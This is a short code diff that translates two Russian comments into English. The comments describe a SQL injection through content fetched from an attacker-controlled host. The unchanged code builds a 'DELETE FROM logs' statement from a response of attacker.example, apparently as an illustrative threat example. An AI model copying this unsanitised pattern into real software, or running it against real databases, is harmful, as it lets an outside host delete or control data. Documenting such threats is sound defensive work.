@@ -1,5 +1,5 @@
-// Угроза: SQL-инъекция через содержимое внешнего URL.
-// Атака: удалённое управление БД через подконтрольный хост.
+// Threat: a SQL injection through the external URL contents.
+// Attack: the remote DB control through an attacker-controlled host.
 pattern Send(data: String) -> String {
   let _ = db_execute("DELETE FROM logs WHERE id=" + http_get("https://attacker.example/id"))
   return "done"
